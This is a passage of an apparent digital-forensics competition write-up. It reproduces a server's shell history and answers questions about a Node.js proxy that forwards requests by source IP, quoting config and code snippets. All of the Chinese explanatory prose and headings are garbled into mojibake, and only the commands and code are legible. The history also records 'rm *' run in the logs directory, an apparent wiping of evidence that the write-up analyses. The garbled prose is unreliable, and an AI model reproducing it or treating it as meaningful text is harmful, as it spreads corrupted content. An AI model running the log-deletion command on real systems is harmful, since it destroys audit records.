class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br></pre></td><td class="code"><pre><code class="hljs tcl"><span class="hljs-number">1</span>  ls<br>   <span class="hljs-number">2</span>  <span class="hljs-keyword">cd</span> Desktop/<br>   <span class="hljs-number">3</span>  ls<br>   <span class="hljs-number">4</span>  uname -a<br>   <span class="hljs-number">5</span>  cat /etc/issue<br>   <span class="hljs-number">6</span>  lsb_release -a<br>   <span class="hljs-number">7</span>  cat /<span class="hljs-keyword">proc</span>/cpuinfo <br>   8<span class="hljs-title">  hostname</span><br>   9<span class="hljs-title">  whoiam</span><br>  10<span class="hljs-title">  whoani</span><br>  11<span class="hljs-title">  whoami</span><br>  12<span class="hljs-title">  lspci</span><br>  13<span class="hljs-title">  env</span><br>  14<span class="hljs-title">  lsusb</span><br>  15<span class="hljs-title">  cat</span> /<span class="hljs-keyword">proc</span>/meminfo <br>  16<span class="hljs-title">  df</span> -h<br>  17<span class="hljs-title">  fsdisk</span> -l<br>  18<span class="hljs-title">  fdisk</span> -l<br>  19<span class="hljs-title">  ps</span> aux<br>  20<span class="hljs-title">  ps</span> -ef<br>  21<span class="hljs-title">  crontab</span> -l<br>  22<span class="hljs-title">  services</span> --status-all<br>  23<span class="hljs-title">  service</span> --status-all<br>  24<span class="hljs-title">  service</span><br>  25<span class="hljs-title">  service</span> --status-all<br>  26<span class="hljs-title">  systemctl</span><br>  27<span class="hljs-title">  systemctl</span> --help<br>  28<span class="hljs-title">  systemctl</span> -all<br>  29<span class="hljs-title">  ls</span><br>  30<span class="hljs-title">  init</span> 3<br>  31<span class="hljs-title">  ls</span><br>  32<span class="hljs-title">  cd</span> /<br>  33<span class="hljs-title">  ls</span><br>  34<span class="hljs-title">  cd</span> opt<br>  35<span class="hljs-title">  ls</span><br>  36<span class="hljs-title">  cd</span> honglianjingsai/<br>  37<span class="hljs-title">  ls</span><br>  38<span class="hljs-title">  cd</span> chronusNode/<br>  39<span class="hljs-title">  ls</span><br>  40<span class="hljs-title">  cd</span> logs<br>  41<span class="hljs-title">  ls</span><br>  42<span class="hljs-title">  rm</span> *<br>  43<span class="hljs-title">  ls</span><br>  44<span class="hljs-title">  ip</span> a<br>  45<span class="hljs-title">  init</span> 3<br>  46<span class="hljs-title">  ls</span><br>  47<span class="hljs-title">  who</span><br>  48<span class="hljs-title">  w</span><br>  49<span class="hljs-title">  cd</span> /opt/<br>  50<span class="hljs-title">  ls</span><br>  51<span class="hljs-title">  cd</span> honglianjingsai/<br>  52<span class="hljs-title">  ls</span><br>  53<span class="hljs-title">  cdd</span> chronusNode/<br>  54<span class="hljs-title">  cd</span> chronusNode/<br>  55  ;s<br>  56<span class="hljs-title">  ls</span><br>  57<span class="hljs-title">  cd</span> controller/<br>  58<span class="hljs-title">  ls</span><br>  59<span class="hljs-title">  ls</span> -l<br>  60<span class="hljs-title">  date</span><br>  61<span class="hljs-title">  history</span><br>  62<span class="hljs-title">  ls</span><br>  63<span class="hljs-title">  cd</span> ..<br>  64<span class="hljs-title">  ls</span><br>  65<span class="hljs-title">  cd</span> logs/<br>  66<span class="hljs-title">  ls</span><br>  67<span class="hljs-title">  ls</span> -l<br>  68<span class="hljs-title">  ls</span><br>  69<span class="hljs-title">  cd</span> ..<br>  70  ;s<br>  71<span class="hljs-title">  ls</span><br>  72<span class="hljs-title">  cd</span> controller/<br>  73<span class="hljs-title">  l;s</span><br>  74<span class="hljs-title">  ls</span><br>  75<span class="hljs-title">  cd</span> ..<br>  76<span class="hljs-title">  l;s</span><br>  77<span class="hljs-title">  ls</span><br>  78<span class="hljs-title">  cd</span> static/<br>  79<span class="hljs-title">  ls</span><br>  80<span class="hljs-title">  cd</span> .<br>  81<span class="hljs-title">  cd</span> ..<br>  82<span class="hljs-title">  ls</span><br>  83<span class="hljs-title">  cd</span> uploads/<br>  84<span class="hljs-title">  ls</span><br>  85<span class="hljs-title">  cd</span> ..<br>  86<span class="hljs-title">  ls</span><br>  87<span class="hljs-title">  cd</span> ..<br>  88<span class="hljs-title">  ls</span><br>  89<span class="hljs-title">  more</span> README.txt <br>  90<span class="hljs-title">  ifconfig</span><br>  91<span class="hljs-title">  netstat</span> -anpt<br>  92<span class="hljs-title">  init</span> 3<br>  93<span class="hljs-title">  vi</span> /etc/sysconfig/network-scripts/ifcfg-ens33 <br>  94<span class="hljs-title">  reboot</span><br>  95<span class="hljs-title">  ifconfig</span><br>  96<span class="hljs-title">  init</span> 3<br>  97<span class="hljs-title">  ls</span><br>  98<span class="hljs-title">  firewall-cmd</span> --add-port 80/tcp<br>  99<span class="hljs-title">  systemctl</span> start<span class="hljs-title"> firewalld</span><br> 100<span class="hljs-title">  firewall-cmd</span> --add-port 80/tcp<br> 101<span class="hljs-title">  ip</span> a<br> 102<span class="hljs-title">  cd</span> /opt<br> 103<span class="hljs-title">  ls</span><br> 104<span class="hljs-title">  cd</span> honglianjingsai/<br> 105<span class="hljs-title">  ls</span><br> 106<span class="hljs-title">  cd</span> chronusNode/<br> 107<span class="hljs-title">  ls</span><br> 108<span class="hljs-title">  cd</span> controller/<br> 109<span class="hljs-title">  ls</span><br> 110<span class="hljs-title">  vi</span> ADProxy.js <br> 111<span class="hljs-title">  ls</span><br> 112<span class="hljs-title">  cd</span> /opt/<br> 113<span class="hljs-title">  ls</span><br> 114<span class="hljs-title">  cd</span> honglianjingsai/<br> 115<span class="hljs-title">  ls</span><br> 116<span class="hljs-title">  cd</span> chronusNode/<br> 117<span class="hljs-title">  ls</span><br> 118<span class="hljs-title">  cd</span> controller/<br> 119<span class="hljs-title">  ls</span><br> 120<span class="hljs-title">  more</span> ADProxy.js<br> 121<span class="hljs-title">  clear</span><br> 122<span class="hljs-title">  ls</span><br> 123<span class="hljs-title">  cd</span> ..<br> 124<span class="hljs-title">  ls</span><br> 125<span class="hljs-title">  node</span> app.js <br> 126<span class="hljs-title">  clear</span><br> 127<span class="hljs-title">  history</span><br> 128<span class="hljs-title">  cd</span> /opt/honglianjingsai/<br> 129<span class="hljs-title">  ls</span><br> 130<span class="hljs-title">  cd</span> chronusNode/<br> 131<span class="hljs-title">  ls</span><br> 132<span class="hljs-title">  cd</span> controller/<br> 133<span class="hljs-title">  ls</span><br> 134<span class="hljs-title">  vi</span> ADProxy.js <br> 135<span class="hljs-title">  yum</span> vim<br> 136<span class="hljs-title">  yum</span> install<span class="hljs-title"> vim</span><br> 137<span class="hljs-title">  ls</span><br> 138<span class="hljs-title">  ping</span> www.baidu.com<br> 139<span class="hljs-title">  ping</span> baidu.com<br> 140<span class="hljs-title">  yum</span> install<span class="hljs-title"> vim</span><br> 141<span class="hljs-title">  vim</span> ADProxy.js <br> 142<span class="hljs-title">   more</span> ADProxy.js <br> 143<span class="hljs-title">  vim</span> ADProxy.js <br> 144<span class="hljs-title">  cd</span> ..<br> 145<span class="hljs-title">  lsls</span><br> 146<span class="hljs-title">  ls</span><br> 147<span class="hljs-title">  more</span> README.txt <br> 148<span class="hljs-title">  cd</span> chronusNode/controller/<br> 149<span class="hljs-title">  vim</span> ADProxy.js <br> 150<span class="hljs-title">  cd</span> ..<br> 151<span class="hljs-title">  ls</span><br> 152<span class="hljs-title">  vim</span> const.js <br> 153<span class="hljs-title">  firewall-cmd</span> --zone=public --add-port=80/tcp --permanent<br> 154<span class="hljs-title">  ifconfig</span><br> 155<span class="hljs-title">  ping</span> 192.168.110.111<br> 156<span class="hljs-title">  ls</span><br> 157<span class="hljs-title">  cd</span> controller/<br> 158<span class="hljs-title">  ls</span><br> 159<span class="hljs-title">  vim</span> ADProxy.js <br> 160<span class="hljs-title">  firewall-cmd</span> --add-port=80/tcp --permanent<br> 161<span class="hljs-title">  systemctl</span> stop<span class="hljs-title"> firewalld</span><br> 162<span class="hljs-title">  vim</span> ADProxy.js <br> 163<span class="hljs-title">  LS</span><br> 164<span class="hljs-title">  ls</span><br> 165<span class="hljs-title">  cd</span> ..<br> 166<span class="hljs-title">  ls</span><br> 167<span class="hljs-title">  cd</span> logs/<br> 168<span class="hljs-title">  ls</span><br> 169<span class="hljs-title">  more</span> 2021-4-23-6-34.log <br> 170<span class="hljs-title">  more</span> 2021-4-23-6-31.log <br> 171<span class="hljs-title">  cd</span> ..<br> 172<span class="hljs-title">  cd</span> controller/<br> 173<span class="hljs-title">  ls</span><br> 174<span class="hljs-title">  vim</span> ADProxy.js <br> 175<span class="hljs-title">  vim</span> /etc/hosts<br> 176<span class="hljs-title">  vim</span> ADProxy.js <br> 177<span class="hljs-title">  cd</span> ..<br> 178<span class="hljs-title">  ls</span><br> 179<span class="hljs-title">  node</span> app.js<br> 180<span class="hljs-title">  reboot</span><br> 181<span class="hljs-title">  cd</span> /opt<br> 182<span class="hljs-title">  ls</span><br> 183<span class="hljs-title">  cd</span> honglianjingsai/<br> 184<span class="hljs-title">  ls</span><br> 185<span class="hljs-title">  cd</span> chronusNode/<br> 186<span class="hljs-title">  ls</span><br> 187<span class="hljs-title">  node</span> app.js<br> 188<span class="hljs-title">  history</span><br> 189<span class="hljs-title">  cd</span> /opt/<br> 190<span class="hljs-title">  cd</span> honglianjingsai/<br> 191<span class="hljs-title">  ls</span><br> 192<span class="hljs-title">  cd</span> chronusNode/<br> 193<span class="hljs-title">  cd</span> controller/<br> 194<span class="hljs-title">  ls</span><br> 195<span class="hljs-title">  vim</span> ADProxy.js <br> 196<span class="hljs-title">  cd</span> ..<br> 197<span class="hljs-title">  ls</span><br> 198<span class="hljs-title">  cd</span> logs/<br> 199<span class="hljs-title">  l;s</span><br> 200<span class="hljs-title">  ls</span><br> 201<span class="hljs-title">  ll</span><br> 202<span class="hljs-title">  vim</span> 2021-4-23-17-36.log <br> 203<span class="hljs-title">  cd</span> /opt/<br> 204<span class="hljs-title">  ls</span><br> 205<span class="hljs-title">  cd</span> honglianjingsai/<br> 206<span class="hljs-title">  ls</span><br> 207<span class="hljs-title">  cd</span> chronusNode/<br> 208<span class="hljs-title">  ls</span><br> 209<span class="hljs-title">  cd</span> controller/<br> 210<span class="hljs-title">  ls</span><br> 211<span class="hljs-title">  vim</span> ADProxy.js <br> 212<span class="hljs-title">  history</span><br> 213<span class="hljs-title">  reboot</span><br> 214<span class="hljs-title">  cd</span> /opt/honglianjingsai/<br> 215<span class="hljs-title">  ls</span><br> 216<span class="hljs-title">  cd</span> chronusNode/<br> 217<span class="hljs-title">  ls</span><br> 218<span class="hljs-title">  cd</span> logs<br> 219<span class="hljs-title">  ls</span> -la<br> 220<span class="hljs-title">  cat</span> 2021-4-23-6-53.log <br> 221<span class="hljs-title">  cat</span> 2021-4-23-17-39.log <br> 222<span class="hljs-title">  date</span><br> 223<span class="hljs-title">  systemctl</span> start<span class="hljs-title"> firewalld</span><br> 224<span class="hljs-title">  firewall-cmd</span> --add-port 80/tcp<br> 225<span class="hljs-title">  cd</span> ..<br> 226<span class="hljs-title">  ls</span><br> 227<span class="hljs-title">  cd</span> controller/<br> 228<span class="hljs-title">  ls</span><br> 229<span class="hljs-title">  vi</span> ADProxy.js <br> 230<span class="hljs-title">  ls</span><br> 231<span class="hljs-title">  vi</span> ADTCPDeliver.js <br> 232<span class="hljs-title">  vi</span> ADFileServer.js <br> 233<span class="hljs-title">  ls</span><br> 234<span class="hljs-title">  cd</span> ..<br> 235<span class="hljs-title">  ls</span><br> 236<span class="hljs-title">  vi</span> app.js <br> 237<span class="hljs-title">  ls</span><br> 238<span class="hljs-title">  cd</span> controller/<br> 239<span class="hljs-title">  ls</span><br> 240<span class="hljs-title">  vi</span> ADProxy.js <br> 241<span class="hljs-title">  ls</span><br> 242<span class="hljs-title">  cd</span> ..<br> 243<span class="hljs-title">  ls</span><br> 244<span class="hljs-title">  cd</span> model/<br> 245<span class="hljs-title">  ls</span><br> 246<span class="hljs-title">  cd</span> ..<br> 247<span class="hljs-title">  ls</span><br> 248<span class="hljs-title">  cd</span> node_modules/<br> 249<span class="hljs-title">  ls</span><br> 250<span class="hljs-title">  ifconfig</span><br> 251<span class="hljs-title">  reboot</span><br> 252<span class="hljs-title">  clear</span><br> 253<span class="hljs-title">  cd</span> /opt/honglianjingsai/chronusNode/<br> 254<span class="hljs-title">  ls</span><br> 255<span class="hljs-title">  cd</span> logs/<br> 256<span class="hljs-title">  ls</span><br> 257<span class="hljs-title">  ls</span> -la<br> 258<span class="hljs-title">  cd</span> .<br> 259<span class="hljs-title">  ls</span><br> 260<span class="hljs-title">  ls</span> -la<br> 261<span class="hljs-title">  date</span><br> 262<span class="hljs-title">  vim</span> 2021-4-23-18-59.log <br> 263<span class="hljs-title">  date</span><br> 264<span class="hljs-title">  timedatectl</span><br> 265<span class="hljs-title">  timedatectl</span> set-timezone<span class="hljs-title"> UTC</span><br> 266<span class="hljs-title">  timedatectl</span><br> 267<span class="hljs-title">  date</span><br> 268<span class="hljs-title">  ls</span><br> 269<span class="hljs-title">  last</span><br> 270<span class="hljs-title">  clear</span><br> 271<span class="hljs-title">  ififconfigiig</span><br> 272<span class="hljs-title">  ifconfig</span><br> 273<span class="hljs-title">  reboot</span><br> 274<span class="hljs-title">  clear</span><br> 275<span class="hljs-title">  ifconfig</span><br> 276<span class="hljs-title">  ifconfig</span><br> 277<span class="hljs-title">  cd</span> /opt/honglianjingsai/chronusNode/<br> 278<span class="hljs-title">  node</span> app.js <br> 279<span class="hljs-title">  shutdown</span> -r<span class="hljs-title"> now</span><br><br></code></pre></td></tr></table></figure><p>ä»åé¢å‡ é¢˜å¯ä»¥çœ‹å‡ºï¼Œè¯¥æœåŠ¡å™¨ä¸»è¦å®ç°å¯¹ä¸åŒæœåŠ¡å™¨çš„è½¬å‘ï¼Œå› æ­¤åŠŸèƒ½ä¸º<code>è´Ÿè½½å‡è¡¡</code></p><h2 id="ç¬¬åäº”é¢˜"><a href="#ç¬¬åäº”é¢˜" class="headerlink" title="ç¬¬åäº”é¢˜"></a>ç¬¬åäº”é¢˜</h2><h3 id="ä¸Šä¸€é¢˜ä¸­ï¼Œæåˆ°çš„ä¸»è¦åŠŸèƒ½å¯¹åº”çš„æœåŠ¡ç›‘å¬çš„ç«¯å£ä¸ºï¼š"><a href="#ä¸Šä¸€é¢˜ä¸­ï¼Œæåˆ°çš„ä¸»è¦åŠŸèƒ½å¯¹åº”çš„æœåŠ¡ç›‘å¬çš„ç«¯å£ä¸ºï¼š" class="headerlink" title="ä¸Šä¸€é¢˜ä¸­ï¼Œæåˆ°çš„ä¸»è¦åŠŸèƒ½å¯¹åº”çš„æœåŠ¡ç›‘å¬çš„ç«¯å£ä¸ºï¼š"></a>ä¸Šä¸€é¢˜ä¸­ï¼Œæåˆ°çš„ä¸»è¦åŠŸèƒ½å¯¹åº”çš„æœåŠ¡ç›‘å¬çš„ç«¯å£ä¸ºï¼š</h3><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506170716864.png"><br>æ‰“å¼€<code>chronusNode/const.js</code>ï¼Œå¾—åˆ°æœåŠ¡å™¨åŸºæœ¬é…ç½®ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">*</span> <span class="hljs-string">æœåŠ¡å™¨åŸºæœ¬é…ç½®</span> <span class="hljs-string">*/</span><br>    <span class="hljs-attr">server_config :</span> &#123;<br>        <span class="hljs-attr">host :</span> <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,<br>        <span class="hljs-attr">port :</span> <span class="hljs-number">80</span>,<br>        <span class="hljs-attr">safe_port :</span> <span class="hljs-number">8443</span>,<br>        <span class="hljs-attr">static_path :</span> <span class="hljs-string">&#x27;static&#x27;</span>,<br>        <span class="hljs-attr">static_host :</span> <span class="hljs-string">&#x27;127.0.0.1&#x27;</span><br>    &#125;<span class="hljs-string">,</span><br></code></pre></td></tr></table></figure><p>å› æ­¤å¾—åˆ°ç«¯å£ä¸º<code>80</code></p><h2 id="ç¬¬åå…­é¢˜"><a href="#ç¬¬åå…­é¢˜" class="headerlink" title="ç¬¬åå…­é¢˜"></a>ç¬¬åå…­é¢˜</h2><h3 id="ä¸Šä¸€é¢˜ä¸­ï¼Œæåˆ°çš„æœåŠ¡æ‰€ä½¿ç”¨çš„å¯åŠ¨å‘½ä»¤ä¸ºï¼š"><a href="#ä¸Šä¸€é¢˜ä¸­ï¼Œæåˆ°çš„æœåŠ¡æ‰€ä½¿ç”¨çš„å¯åŠ¨å‘½ä»¤ä¸ºï¼š" class="headerlink" title="ä¸Šä¸€é¢˜ä¸­ï¼Œæåˆ°çš„æœåŠ¡æ‰€ä½¿ç”¨çš„å¯åŠ¨å‘½ä»¤ä¸ºï¼š"></a>ä¸Šä¸€é¢˜ä¸­ï¼Œæåˆ°çš„æœåŠ¡æ‰€ä½¿ç”¨çš„å¯åŠ¨å‘½ä»¤ä¸ºï¼š</h3><p>ä»å†å²å‘½ä»¤</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">277 </span> cd /opt/honglianjingsai/chronusNode/<br><span class="hljs-symbol">278 </span> node app.js <br><span class="hljs-symbol">279 </span> shutdown -r now<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºï¼Œå¯åŠ¨å‘½ä»¤ä¸ºï¼š<code>node app.js</code></p><h2 id="ç¬¬åä¸ƒé¢˜"><a href="#ç¬¬åä¸ƒé¢˜" class="headerlink" title="ç¬¬åä¸ƒé¢˜"></a>ç¬¬åä¸ƒé¢˜</h2><h3 id="ç»åˆ†æï¼Œè¯¥æœåŠ¡å¯¹äºè¯·æ±‚æ¥æºIPçš„å¤„ç†ä¾æ®æ˜¯ï¼šæ ¹æ®è¯·æ±‚æºIPåœ°å€çš„ç¬¬ï¼ˆï¼‰ä½è¿›è¡Œåˆ¤æ–­ã€æ ‡å‡†æ ¼å¼ï¼š9ã€‘"><a href="#ç»åˆ†æï¼Œè¯¥æœåŠ¡å¯¹äºè¯·æ±‚æ¥æºIPçš„å¤„ç†ä¾æ®æ˜¯ï¼šæ ¹æ®è¯·æ±‚æºIPåœ°å€çš„ç¬¬ï¼ˆï¼‰ä½è¿›è¡Œåˆ¤æ–­ã€æ ‡å‡†æ ¼å¼ï¼š9ã€‘" class="headerlink" title="ç»åˆ†æï¼Œè¯¥æœåŠ¡å¯¹äºè¯·æ±‚æ¥æºIPçš„å¤„ç†ä¾æ®æ˜¯ï¼šæ ¹æ®è¯·æ±‚æºIPåœ°å€çš„ç¬¬ï¼ˆï¼‰ä½è¿›è¡Œåˆ¤æ–­ã€æ ‡å‡†æ ¼å¼ï¼š9ã€‘"></a>ç»åˆ†æï¼Œè¯¥æœåŠ¡å¯¹äºè¯·æ±‚æ¥æºIPçš„å¤„ç†ä¾æ®æ˜¯ï¼šæ ¹æ®è¯·æ±‚æºIPåœ°å€çš„ç¬¬ï¼ˆï¼‰ä½è¿›è¡Œåˆ¤æ–­ã€æ ‡å‡†æ ¼å¼ï¼š9ã€‘</h3><p>åœ¨<code>/chronusNode/controller/ADProxy.js</code>ä¸­è¿›è¡ŒæŸ¥çœ‹<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506171808235.png"><br>å¾—åˆ°æ˜¯<code>clientIPArr[2]</code>ï¼Œå³ç¬¬<code>3</code>ä½</p><h2 id="ç¬¬åå…«é¢˜"><a href="#ç¬¬åå…«é¢˜" class="headerlink" title="ç¬¬åå…«é¢˜"></a>ç¬¬åå…«é¢˜</h2><h3 id="ç»åˆ†æï¼Œå½“åˆ¤æ–­æ¡ä»¶å°äº50æ—¶ï¼ŒæœåŠ¡å™¨ä¼šå°†è¯¥è¯·æ±‚è½¬å‘åˆ°IPä¸ºï¼ˆï¼‰çš„æœåŠ¡å™¨ä¸Šã€æ ‡å‡†æ ¼å¼ï¼š111-111-111-111ã€‘"><a href="#ç»åˆ†æï¼Œå½“åˆ¤æ–­æ¡ä»¶å°äº50æ—¶ï¼ŒæœåŠ¡å™¨ä¼šå°†è¯¥è¯·æ±‚è½¬å‘åˆ°IPä¸ºï¼ˆï¼‰çš„æœåŠ¡å™¨ä¸Šã€æ ‡å‡†æ ¼å¼ï¼š111-111-111-111ã€‘" class="headerlink" title="ç»åˆ†æï¼Œå½“åˆ¤æ–­æ¡ä»¶å°äº50æ—¶ï¼ŒæœåŠ¡å™¨ä¼šå°†è¯¥è¯·æ±‚è½¬å‘åˆ°IPä¸ºï¼ˆï¼‰çš„æœåŠ¡å™¨ä¸Šã€æ ‡å‡†æ ¼å¼ï¼š111.111.111.111ã€‘"></a>ç»åˆ†æï¼Œå½“åˆ¤æ–­æ¡ä»¶å°äº50æ—¶ï¼ŒæœåŠ¡å™¨ä¼šå°†è¯¥è¯·æ±‚è½¬å‘åˆ°IPä¸ºï¼ˆï¼‰çš„æœåŠ¡å™¨ä¸Šã€æ ‡å‡†æ ¼å¼ï¼š111.111.111.111ã€‘</h3><p>åœ¨ä»£ç ä¸­å¾—åˆ°</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (clientIP3Int &lt;= <span class="hljs-number">50</span>) &#123;<br>                        <span class="hljs-variable language_">global</span>.<span class="hljs-property">logger</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">&#x27;[Proxy_Destination] -&gt; &#x27;</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(_proxy50));<br>                        <span class="hljs-keyword">return</span> _proxy50<br><br></code></pre></td></tr></table></figure><p>åŒæ—¶åœ¨ä¸Šé¢ä»£ç æœ‰ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> _proxy50 = &#123;<br>        <span class="hljs-attr">protocol</span>: <span class="hljs-string">&#x27;http:&#x27;</span>,<br>        <span class="hljs-attr">host</span>: <span class="hljs-string">&#x27;192.168.110.111&#x27;</span>,<br>        <span class="hljs-attr">port</span>: <span class="hljs-number">80</span><br>    &#125;<br><br></code></pre></td></tr></table></figure><p>å› æ­¤ä¼šå‘åˆ°<code>192.168.110.111</code></p><h2 id="ç¬¬åä¹é¢˜"><a href="#ç¬¬åä¹é¢˜" class="headerlink" title="ç¬¬åä¹é¢˜"></a>ç¬¬åä¹é¢˜</h2><h3 id="è¯·åˆ†æï¼Œè¯¥æœåŠ¡å™¨è½¬å‘çš„ç›®æ ‡æœåŠ¡å™¨ä¸€å…±æœ‰å‡ å°ã€æ ‡å‡†æ ¼å¼ï¼š9ã€‘"><a href="#è¯·åˆ†æï¼Œè¯¥æœåŠ¡å™¨è½¬å‘çš„ç›®æ ‡æœåŠ¡å™¨ä¸€å…±æœ‰å‡ å°ã€æ ‡å‡†æ ¼å¼ï¼š9ã€‘" class="headerlink" title="è¯·åˆ†æï¼Œè¯¥æœåŠ¡å™¨è½¬å‘çš„ç›®æ ‡æœåŠ¡å™¨ä¸€å…±æœ‰å‡ å°ã€æ ‡å‡†æ ¼å¼ï¼š9ã€‘"></a>è¯·åˆ†æï¼Œè¯¥æœåŠ¡å™¨è½¬å‘çš„ç›®æ ‡æœåŠ¡å™¨ä¸€å…±æœ‰å‡ å°ã€æ ‡å‡†æ ¼å¼ï¼š9ã€‘</h3><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506172444582.png"><br>å¯ä»¥çœ‹åˆ°ï¼Œæ˜¯<code>3</code>å°</p><h2 id="ç¬¬äºŒåé¢˜"><a href="#ç¬¬äºŒåé¢˜" class="headerlink" title="ç¬¬äºŒåé¢˜"></a>ç¬¬äºŒåé¢˜</h2><h3 id="è¯·åˆ†æï¼Œå—å®³è€…é€šè®¯å½•è¢«è·å–æ—¶ï¼Œå…¶è®¾å¤‡çš„IPåœ°å€ä¸ºã€æ ‡å‡†æ ¼å¼ï¼š111-111-111-111ã€‘"><a href="#è¯·åˆ†æï¼Œå—å®³è€…é€šè®¯å½•è¢«è·å–æ—¶ï¼Œå…¶è®¾å¤‡çš„IPåœ°å€ä¸ºã€æ ‡å‡†æ ¼å¼ï¼š111-111-111-111ã€‘" class="headerlink" 